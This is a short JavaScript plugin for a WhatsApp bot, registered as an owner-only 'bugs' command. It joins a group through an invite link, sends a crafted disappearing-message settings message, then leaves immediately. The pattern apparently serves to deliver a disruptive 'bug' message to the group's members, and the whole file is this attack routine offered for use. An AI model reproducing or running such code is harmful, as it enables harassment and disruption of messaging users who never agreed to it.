let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i

let handler = async (m, { conn, text }) => {
    let [_, code] = text.match(linkRegex) || []
    if (!code) throw 'Link invalid'
    let { gid: target } = await this.joinvialink(code)
await this.relayWAMessage(global.mm=this.
prepareMessageFromContent(target, this.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0})
await this.groupLeave(target)
}

handler.help = ['bugs']
handler.tags = ['owner']
handler.command = /^bugs$/i

handler.owner = true

module.exports = handler